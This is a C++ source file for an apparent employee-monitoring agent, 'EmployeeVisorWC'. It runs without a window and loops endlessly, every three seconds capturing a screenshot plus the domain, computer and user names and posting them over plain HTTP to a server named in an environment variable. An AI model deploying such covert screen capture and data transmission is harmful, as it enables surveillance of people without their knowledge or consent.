// ev.cpp : Определяет точку входа для приложения.
//

#include "framework.h"
#include "ev.h"

#include "utils.hpp"

#include <string>
#include <iostream>

#pragma comment(lib, "rpcrt4.lib")  // UuidCreate - Minimum supported OS Win 2000
#include <rpc.h>

#include <Winhttp.h>
#pragma comment(lib, "Winhttp")

#include <Shlwapi.h> // SHRegGetValue
#pragma comment(lib, "Shlwapi")

#define HTTP_TIMEOUT 15000

// Память вроде чищу, но не факт, что везде это как надо работает. Не прогнал тесты

// Просто создадим WinApi проект, у которого нет графического окна

constexpr auto HOST_ENV_VAR_NAME = L"SERVER_VAR";
constexpr auto buff_size = static_cast<DWORD>(100);
constexpr auto DELTA_SEC = static_cast<DWORD>(3);
// Пока на правах костыля
const WCHAR* SAVE_BITMAP_TO = L"PATH_TO_FILE";

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    auto buff = new WCHAR[buff_size];

    const auto var_size = GetEnvironmentVariable(HOST_ENV_VAR_NAME, buff, buff_size);

    if (var_size == 0) {
        return 1;
    }
    else if (var_size > buff_size) {

        // OK, so 50 isn't big enough.
        if (buff) {
            delete[] buff;
        }
        buff = new WCHAR[var_size];

        const auto new_size = GetEnvironmentVariable(HOST_ENV_VAR_NAME, buff, var_size);

        if (new_size == 0 || new_size > var_size) {
            // wtf case
            return 2;
        }
    }

    while (buff != NULL) {
        auto l = static_cast<DWORD>(0);

        auto gd = getDomain();
        auto d = std::wstring((gd == NULL ? L"" : gd));
        delete[] gd;
        auto gc = getComputerName(l);
        auto c = std::wstring((gc == NULL ? L"" : gc));
        delete[] gc;
        auto gu = getUsername(l);
        auto u = std::wstring((gu == NULL ? L"" : gu));
        delete[] gu;
        

        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

        hSession = WinHttpOpen(L"EmployeeVisorWC",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (hSession)
            hConnect = WinHttpConnect(hSession, buff,
                INTERNET_DEFAULT_HTTP_PORT, 0);

        if (hConnect)
            hRequest = WinHttpOpenRequest(hConnect, L"POST",
                L"/ua",
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0);

        BOOL bResults = FALSE;

        SaveBitmap(SAVE_BITMAP_TO);

        auto bitmapAsStr = ReadBitmap(SAVE_BITMAP_TO);

        auto data = d + L"\n" + c + L"\n" + u + L"\n" + bitmapAsStr;

        wprintf(L"Sending %s %s %s\n", d.c_str(), c.c_str(), u.c_str());

        if (hRequest) {
            WinHttpAddRequestHeaders(hRequest, L"Content-Type: text/plain", -1L, WINHTTP_ADDREQ_FLAG_ADD);
            wprintf(L"Got hRequest\n");
            bResults = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS,
                0, (LPVOID*)(data.c_str()), data.size(),
                data.size(), 0);
        }
        else {
            wprintf(L"Could not get hRequest\n");
        }

        if (!bResults)
            wprintf(L"Error %d has occurred.\n", GetLastError());

        // Close open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        Sleep(1000 * DELTA_SEC);
    }

    return 0;
}